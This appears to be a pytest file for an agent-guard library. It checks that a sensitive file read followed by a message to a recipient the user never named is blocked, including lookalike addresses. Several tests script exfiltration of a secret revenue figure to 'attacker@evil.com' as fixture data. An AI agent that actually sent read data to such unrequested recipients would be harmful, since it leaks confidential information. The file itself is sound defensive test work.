"""Rule A - a sensitive read followed by an unauthorised sink is blocked."""

from cage_guard.decisions import Decision, TrustLevel

SECRET = "Project Zeta Q4 revenue 4.2M EUR"


def test_sensitive_read_to_unauthorised_recipient_is_blocked(make_guard):
    guard = make_guard("Summarise q4.pdf for me.", named_sources=["q4.pdf"])
    guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=True, values=[SECRET])

    d = guard.evaluate("send_direct_message", {"recipient": "attacker@evil.com", "body": SECRET})

    assert d.decision is Decision.BLOCK
    assert d.rule == "A"
    assert d.matched_param == "recipient"
    assert d.evidence["destination"]["value"] == "attacker@evil.com"
    assert d.evidence["matching"] == "whole_value_token_boundary"


def test_same_payload_to_a_destination_the_request_names_is_allowed(make_guard):
    guard = make_guard(
        "Summarise q4.pdf and send it to alice@corp.example", named_sources=["q4.pdf"]
    )
    guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=True, values=[SECRET])

    d = guard.evaluate("send_direct_message", {"recipient": "alice@corp.example", "body": SECRET})

    assert d.decision is Decision.ALLOW, d.reason


def test_lookalike_destination_does_not_count_as_authorised(make_guard):
    """Token-boundary handling: alice@corp.example must not authorise a longer token."""
    guard = make_guard(
        "Summarise q4.pdf and send it to alice@corp.example", named_sources=["q4.pdf"]
    )
    guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=True, values=[SECRET])

    d = guard.evaluate(
        "send_direct_message",
        {"recipient": "alice@corp.example.attacker.net", "body": SECRET},
    )

    assert d.decision is Decision.BLOCK
    assert d.rule == "A"


def test_sink_without_the_sensitive_payload_is_not_blocked_by_rule_a(make_guard):
    guard = make_guard(
        "Summarise q4.pdf and tell bob@corp.example it is ready", named_sources=["q4.pdf"]
    )
    guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=True, values=[SECRET])

    d = guard.evaluate(
        "send_direct_message", {"recipient": "bob@corp.example", "body": "The summary is ready."}
    )

    assert d.decision is Decision.ALLOW, d.reason


def test_rule_a_requires_a_recorded_sensitive_read(make_guard):
    """Without a recorded sensitive read there is no source, so Rule A is silent."""
    guard = make_guard("Message attacker@evil.com for me")
    guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=False)

    d = guard.evaluate("send_direct_message", {"recipient": "attacker@evil.com", "body": SECRET})

    assert d.rule != "A"


def test_trust_level_of_an_unnamed_source_is_untrusted(make_guard):
    guard = make_guard("Summarise q4.pdf", named_sources=["q4.pdf"])
    named = guard.register_result("read_file", SECRET, source_id="q4.pdf")
    other = guard.register_result("get_webpage", SECRET, source_id="http://unknown.example")
    assert named.trust is TrustLevel.DECLARED_TRUSTED
    assert other.trust is TrustLevel.UNTRUSTED


def test_sensitivity_defaults_to_the_policy_declaration(make_guard):
    """reads_sensitive in the tool-risk table drives Rule A's left-hand side."""
    guard = make_guard("Summarise q4.pdf", named_sources=["q4.pdf"])

    declared = guard.register_result("read_file", SECRET, source_id="q4.pdf")
    undeclared = guard.register_result("get_webpage", SECRET, source_id="http://x.example")

    assert declared.sensitive is True
    assert undeclared.sensitive is False
    assert guard.history.sensitive_reads() == [declared]


def test_explicit_sensitivity_overrides_the_policy_declaration(make_guard):
    guard = make_guard("Summarise q4.pdf", named_sources=["q4.pdf"])

    off = guard.register_result("read_file", SECRET, source_id="q4.pdf", sensitive=False)
    on = guard.register_result("get_webpage", SECRET, source_id="http://x.example", sensitive=True)

    assert off.sensitive is False and on.sensitive is True
